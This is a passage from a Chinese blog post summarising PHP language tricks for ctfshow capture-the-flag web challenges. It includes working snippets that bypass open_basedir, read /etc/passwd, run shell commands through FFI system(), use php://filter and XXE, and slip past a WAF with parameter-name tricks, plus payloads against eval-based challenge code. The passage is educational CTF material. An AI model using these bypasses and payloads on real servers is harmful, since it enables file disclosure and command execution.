+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">GlobIterator</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$a</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nv">$f</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><h5 id="绕过-open_basedir">
+<a class="header-anchor" href="#%e7%bb%95%e8%bf%87-open_basedir"></a>
+绕过 open_basedir
+</h5><h6 id="获取目录">
+<a class="header-anchor" href="#%e8%8e%b7%e5%8f%96%e7%9b%ae%e5%bd%95"></a>
+获取目录
+</h6><p>DirectoryIterator类 + glob://协议</p>
+<p>DirectoryIterator与glob://协议结合将无视open_basedir对目录的限制</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">print_r</span><span class="p">(</span><span class="nx">ini_get</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$dir_array</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="nv">$dir</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DirectoryIterator</span><span class="p">(</span><span class="s1">&#39;glob:///*&#39;</span><span class="p">);</span><span class="c1">//目录内容
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">foreach</span><span class="p">(</span><span class="nv">$dir</span> <span class="k">as</span> <span class="nv">$d</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">	    <span class="nv">$dir_array</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">-&gt;</span><span class="na">__toString</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="nv">$dir</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DirectoryIterator</span><span class="p">(</span><span class="s1">&#39;glob:///.*&#39;</span><span class="p">);</span><span class="c1">//. ..
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">foreach</span><span class="p">(</span><span class="nv">$dir</span> <span class="k">as</span> <span class="nv">$d</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">	    <span class="nv">$dir_array</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">-&gt;</span><span class="na">__toString</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="nx">sort</span><span class="p">(</span><span class="nv">$dir_array</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">foreach</span><span class="p">(</span><span class="nv">$dir_array</span> <span class="k">as</span> <span class="nv">$d</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">	    <span class="k">echo</span> <span class="nv">$d</span><span class="o">.</span><span class="s1">&#39; &#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>FilesystemIterator类 + glob://协议</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dir_array</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$dir</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FilesystemIterator</span><span class="p">(</span><span class="s1">&#39;glob:///*&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$dir</span> <span class="k">as</span> <span class="nv">$d</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$dir_array</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">-&gt;</span><span class="na">__toString</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$dir</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FilesystemIterator</span><span class="p">(</span><span class="s1">&#39;glob:///.*&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$dir</span> <span class="k">as</span> <span class="nv">$d</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$dir_array</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">-&gt;</span><span class="na">__toString</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">sort</span><span class="p">(</span><span class="nv">$dir_array</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$dir_array</span> <span class="k">as</span> <span class="nv">$d</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nv">$d</span><span class="o">.</span><span class="s1">&#39; &#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h6 id="文件读取">
+<a class="header-anchor" href="#%e6%96%87%e4%bb%b6%e8%af%bb%e5%8f%96"></a>
+文件读取
+</h6><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span><span class="s1">&#39;/coleak/c&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">print_r</span><span class="p">(</span><span class="nx">ini_get</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">	<span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;/flag.txt&#39;</span><span class="p">);</span>
+</span></span></code></pre></div><p><code>这里由于设置了文件工作目录无法直接读取到flag，需要绕过open_basedir,但shell命令不受影响官方文档显示脚本内定义的open_basedir只能收紧在php.ini的配置。而不能拓宽配置，因此不能直接使用ini_set_来修改路径ini_set(‘open_basedir’,‘/’);</code></p>
+<h5 id="读取文件">
+<a class="header-anchor" href="#%e8%af%bb%e5%8f%96%e6%96%87%e4%bb%b6"></a>
+读取文件
+</h5><h6 id="splfileobject类">
+<a class="header-anchor" href="#splfileobject%e7%b1%bb"></a>
+SplFileObject类
+</h6><p>读取文件的一行</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$context</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SplFileObject</span><span class="p">(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$context</span><span class="p">;</span>
+</span></span></code></pre></div><p>对文件中的每一行内容进行遍历</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$context</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SplFileObject</span><span class="p">(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$context</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">hdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span><span class="s1">&#39;C:\\&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">print_r</span><span class="p">(</span><span class="nx">ini_get</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;C:\\test\\test.txt&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err"> 
+</span></span></span></code></pre></div><h4 id="simplexmlelement-类进行-xxe">
+<a class="header-anchor" href="#simplexmlelement-%e7%b1%bb%e8%bf%9b%e8%a1%8c-xxe"></a>
+SimpleXMLElement 类进行 XXE
+</h4><h5 id="simplexmlelement">
+<a class="header-anchor" href="#simplexmlelement"></a>
+SimpleXMLElement
+</h5><p><code>__construct</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250719222950523.png" alt="图片预览"></p>
+<p>可以看到通过设置第三个参数 data_is_url 为 <code>true</code>，我们可以实现远程xml文件的载入。第二个参数的常量值我们设置为<code>2</code>即可。第一个参数 data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。</p>
+<p>[SUCTF 2018]Homework</p>
+<h4 id="ffi执行system">
+<a class="header-anchor" href="#ffi%e6%89%a7%e8%a1%8csystem"></a>
+FFI执行system()
+</h4><p>FFI::cdef 方法用于定义 C 函数原型，其中 int system(const char *command); 是 C 语言中 system  函数的声明。system 函数接受一个字符串参数（即Shell命令），并在系统的命令行中执行该命令；</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$ffi</span> <span class="o">=</span> <span class="nx">FFI</span><span class="o">::</span><span class="na">cdef</span><span class="p">(</span><span class="s2">&#34;int system(const char *command);&#34;</span><span class="p">);</span><span class="c1">//创建一个system对象
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$a</span><span class="o">=</span><span class="s1">&#39;/readflag &gt; 1.txt&#39;</span><span class="p">;</span><span class="c1">//没有回显的
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$ffi</span><span class="o">-&gt;</span><span class="na">system</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span><span class="c1">//通过$ffi去调用system函数
+</span></span></span></code></pre></div><h3 id="伪协议支持的协议和封装协议">
+<a class="header-anchor" href="#%e4%bc%aa%e5%8d%8f%e8%ae%ae%e6%94%af%e6%8c%81%e7%9a%84%e5%8d%8f%e8%ae%ae%e5%92%8c%e5%b0%81%e8%a3%85%e5%8d%8f%e8%ae%ae"></a>
+伪协议（支持的协议和封装协议）
+</h3><p><a href="https://www.php.net/manual/zh/wrappers.php">PHP: 支持的协议和封装协议 - Manual</a></p>
+<ul>
+<li><a href="https://www.php.net/manual/zh/wrappers.file.php">file://</a> — 访问本地文件系统</li>
+<li><a href="https://www.php.net/manual/zh/wrappers.http.php">http://</a> — 访问 HTTP(s) 网址</li>
+<li><a href="https://www.php.net/manual/zh/wrappers.ftp.php">ftp://</a> — 访问 FTP(s) URLs</li>
+<li><a href="https://www.php.net/manual/zh/wrappers.php.php">php://</a> — 访问各个输入/输出流（I/O streams）</li>
+<li><a href="https://www.php.net/manual/zh/wrappers.compression.php">zlib://</a> — 压缩流</li>
+<li><a href="https://www.php.net/manual/zh/wrappers.data.php">data://</a> — 数据（RFC 2397）</li>
+<li><a href="https://www.php.net/manual/zh/wrappers.glob.php">glob://</a> — 查找匹配的文件路径模式</li>
+<li><a href="https://www.php.net/manual/zh/wrappers.phar.php">phar://</a> — PHP 归档</li>
+<li><a href="https://www.php.net/manual/zh/wrappers.ssh2.php">ssh2://</a> — 安全外壳协议 2</li>
+<li><a href="https://www.php.net/manual/zh/wrappers.rar.php">rar://</a> — RAR</li>
+<li><a href="https://www.php.net/manual/zh/wrappers.audio.php">ogg://</a> — 音频流</li>
+<li><a href="https://www.php.net/manual/zh/wrappers.expect.php">expect://</a> — 处理交互式的流</li>
+</ul>
+<p>支持伪协议函数</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">include
+</span></span><span class="line"><span class="cl">require
+</span></span><span class="line"><span class="cl">include_once
+</span></span><span class="line"><span class="cl">require_once
+</span></span><span class="line"><span class="cl">highlight_file
+</span></span><span class="line"><span class="cl">file_get_contents
+</span></span></code></pre></div><h4 id="骚姿势">
+<a class="header-anchor" href="#%e9%aa%9a%e5%a7%bf%e5%8a%bf"></a>
+骚姿势
+</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Php://filter/zlib.deflate|zlib.inflate/resource=flag.php
+</span></span></code></pre></div><h3 id="超全局变量">
+<a class="header-anchor" href="#%e8%b6%85%e5%85%a8%e5%b1%80%e5%8f%98%e9%87%8f"></a>
+超全局变量
+</h3><h4 id="php解析变量机制">
+<a class="header-anchor" href="#php%e8%a7%a3%e6%9e%90%e5%8f%98%e9%87%8f%e6%9c%ba%e5%88%b6"></a>
+php解析变量机制
+</h4><p>在php版本小于8的时候如果参数中出现中括号[，中括号会被转换成下划线_，但是会出现转换错误导致接下来如果该参数名中还有非法字符并不会继续转换成下划线_，也就是说如果中括号[出现在前面，那么中括号[还是会被转换成下划线_，但是因为出错导致接下来的非法字符并不会被转换成下划线_。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1.删除前后的空白符（空格符，制表符，换行符等统称为空白符）
+</span></span><span class="line"><span class="cl">2.将某些字符转换为下划线（包括空格）
+</span></span></code></pre></div><p><code>如果传入%20num,php可解析接收num，但是WAF等设备接受到的是%20num这个变量,根据这一特性，可以绕过WAF</code></p>
+<p>对于</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$_POST[&#39;ctfshow&#39;]
+</span></span></code></pre></div><p>如果传入</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ctfshow[0]=
+</span></span></code></pre></div><p>代表传入数组</p>
+<h4 id="_server">
+<a class="header-anchor" href="#_server"></a>
+$_SERVER[]
+</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$a=$_SERVER[&#39;argv&#39;];
+</span></span></code></pre></div><p>在 PHP 中，$_SERVER[&lsquo;argv&rsquo;] 用于获取脚本的命令行参数，通常，这是在命令行模式下运行 PHP 脚本时使用的，而不是在网页模式下使用。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">php script.php arg1 arg2
+</span></span><span class="line"><span class="cl"><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;argv&#39;</span><span class="o">][</span>0<span class="o">]</span> <span class="o">=</span> <span class="s1">&#39;script.php&#39;</span><span class="p">;</span>  // 脚本名
+</span></span><span class="line"><span class="cl"><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;argv&#39;</span><span class="o">][</span>1<span class="o">]</span> <span class="o">=</span> <span class="s1">&#39;arg1&#39;</span><span class="p">;</span>        // 第一个参数
+</span></span><span class="line"><span class="cl"><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;argv&#39;</span><span class="o">][</span>2<span class="o">]</span> <span class="o">=</span> <span class="s1">&#39;arg2&#39;</span><span class="p">;</span>        // 第二个参数
+</span></span></code></pre></div><p>web网页模式下 在web页模式下必须在php.ini开启<code>register_argc_argv</code>配置项 设置<code>register_argc_argv = On</code>(默认是Off)，重启服务，<code>$_SERVER['argv']</code>才会有效 ，这时</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> $_SERVER[&#39;argv&#39;][0] = $_SERVER[&#39;QUERY_STRING&#39;]
+</span></span><span class="line"><span class="cl"> 即
+</span></span><span class="line"><span class="cl"> $a[0]=$_SERVER[&#39;QUERY_STRING&#39;]
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;argv&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$c</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;fun&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;CTF_SHOW&#39;</span><span class="p">])</span><span class="o">&amp;&amp;</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;CTF_SHOW.COM&#39;</span><span class="p">])</span><span class="o">&amp;&amp;!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;fl0g&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/</span><span class="se">\\\\</span><span class="s2">|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|</span><span class="se">\&#34;</span><span class="s2">|\&#39;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$c</span><span class="p">)</span><span class="o">&lt;=</span><span class="mi">16</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">         <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$c</span><span class="s2">&#34;</span><span class="o">.</span><span class="s2">&#34;;&#34;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">         <span class="k">if</span><span class="p">(</span><span class="nv">$fl0g</span><span class="o">===</span><span class="s2">&#34;flag_give_me&#34;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">             <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">         <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>payload</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET:$fl0g=flag_give_me;
+</span></span><span class="line"><span class="cl">POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=eval($a[0])
+</span></span></code></pre></div><h3 id="预定义常量">
+<a class="header-anchor" href="#%e9%a2%84%e5%ae%9a%e4%b9%89%e5%b8%b8%e9%87%8f"></a>
+预定义常量
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PHP_VERSION
+</span></span><span class="line"><span class="cl">PHP_MAJOR_VERSION
+</span></span><span class="line"><span class="cl">ZEND_DEBUG_BUILD
+</span></span><span class="line"><span class="cl">PHP_MAXPATHLEN
+</span></span><span class="line"><span class="cl">PHP_OS
+</span></span><span class="line"><span class="cl">PHP_INT_MAX
+</span></span><span class="line"><span class="cl">PHP_INT_MIN 
+</span></span><span class="line"><span class="cl">PHP_MANDIR
+</span></span></code></pre></div><h3 id="魔术常量">
+<a class="header-anchor" href="#%e9%ad%94%e6%9c%af%e5%b8%b8%e9%87%8f"></a>
+魔术常量
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">__FILE__
+</span></span><span class="line"><span class="cl">__DIR__
+</span></span><span class="line"><span class="cl">__FUNCTION__
+</span></span></code></pre></div><h3 id="命令行">
+<a class="header-anchor" href="#%e5%91%bd%e4%bb%a4%e8%a1%8c"></a>
+命令行
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">php -a 获取php的shell
+</span></span><span class="line"><span class="cl">php -r 执行php代码
+</span></span><span class="line"><span class="cl">php -S &lt;addr&gt;:&lt;port&gt; 内置服务器
+</span></span><span class="line"><span class="cl">php  -s 高亮文件代码
+</span></span><span class="line"><span class="cl">php -f &lt;file&gt; 解析和执行&lt;file&gt;
+</span></span></code></pre></div><h3 id="姿势收集">
+<a class="header-anchor" href="#%e5%a7%bf%e5%8a%bf%e6%94%b6%e9%9b%86"></a>
+姿势收集
+</h3><h4 id="php冷门函数">
+<a class="header-anchor" href="#php%e5%86%b7%e9%97%a8%e5%87%bd%e6%95%b0"></a>
+php冷门函数
+</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: h1xa
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2020-10-10 11:25:09
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified by:   h1xa
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified time: 2020-10-12 19:49:05
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$f1</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;f1&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$f2</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;f2&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">check</span><span class="p">(</span><span class="nv">$f1</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">var_dump</span><span class="p">(</span><span class="nx">call_user_func</span><span class="p">(</span><span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$f1</span><span class="p">,</span><span class="nv">$f2</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;嗯哼？&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">check</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[0-9]|[a-z]/i&#39;</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p><code>_()==gettext() </code>是gettext()的拓展函数，开启text扩展get_defined_vars — 返回由所有已定义变量所组成的数组。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">Payload</span><span class="err">：?</span><span class="n">f1</span><span class="o">=</span><span class="n">_</span><span class="o">&amp;</span><span class="n">f2</span><span class="o">=</span><span class="n">get_defined_vars</span>
+</span></span></code></pre></div><h4 id="变量覆盖">
+<a class="header-anchor" href="#%e5%8f%98%e9%87%8f%e8%a6%86%e7%9b%96"></a>
+变量覆盖
+</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">extract()
+</span></span><span class="line"><span class="cl">parse_str()
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?_POST[key]=36d&amp;_POST[key2]=36d
+</span></span></code></pre></div></div>
+    <footer class="article-footer"><div class="sponsor-wrapper">
+  <div class="sponsor-button-wrapper">
+    <div class="sponsor-icon rotate"></div>
+    <div class="sponsor-title">赞助</div>
+    <div class="sponsor-icon rotate"></div>
+  </div><div class="sponsor-tip">文章内容有收获?打赏一元</div><div class="sponsor-qr"><div class="sponsor-qr-image-wrapper">
+          <img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250618163116936.jpg" alt="支付宝" width="200" />
+          <p class="sponsor-qr-name">支付宝</p>
+        </div></div></div><div class="share-wrapper"><a href="https://twitter.com/intent/tweet?url=https://www.lier.xin/post/ctfshow_php/&amp;text=Ctfshow_php&amp;via=https://www.lier.xin/" target="_blank" rel="noopener noreferrer" title="Ctfshow_php">
+      <div class="share-icon icon icon-twitter"></div>
+    </a><a href="https://connect.qq.com/widget/shareqq/index.html?url=https://www.lier.xin/post/ctfshow_php/&amp;title=Ctfshow_php&amp;desc=ctfshow%e9%87%8cweb%e5%85%a5%e9%97%a8php%e7%89%b9%e6%80%a7%e7%9a%84%e6%80%bb%e7%bb%93&amp;source=https://www.lier.xin/" target="_blank" rel="noopener noreferrer" title="Ctfshow_php">
+      <div class="share-icon icon icon-qq"></div>
+    </a><a href="javascript:;"  title="Ctfshow_php">
+      <div class="share-icon icon icon-weixin"><div id="share-weixin">
+            <div class="share-weixin-dom">
+              <div class="share-weixin-content">
+                <img id="share-weixin-banner"> 
+                <div id="share-weixin-title"></div>
+                <div id="share-weixin-desc"></div>
+              </div>
+              <div class="share-weixin-qrcode">
+                <div class="share-weixin-info">
+                  <div id="share-weixin-author"></div>
+                  <div id="share-weixin-theme">Powered By hugo-theme-reimu</div>
+                </div>
+                <img id="share-weixin-qr" >
+              </div>
+            </div>
+            <div class="share-weixin-canvas"></div>
+          </div></div>
+    </a></div><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/ctf_show"
+        rel="tag"
+        >CTF_SHOW</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/php%e8%af%ad%e8%a8%80%e7%89%b9%e6%80%a7"
+        rel="tag"
+        >PHP语言特性</a
+      >
+    </li></ul>
+</footer>
+  </div><nav
+    id="article-nav"
+    data-aos="fade-up"
+  ><div class="article-nav-link-wrap article-nav-link-left"><img
+            data-src="/images/buu.png"
+            data-sizes="auto"
+            alt="极客大挑战 2019_FinalSQL"
+            class="lazyload"
+          /><a href="/post/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019_finalsql/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">极客大挑战 2019_FinalSQL</h3>
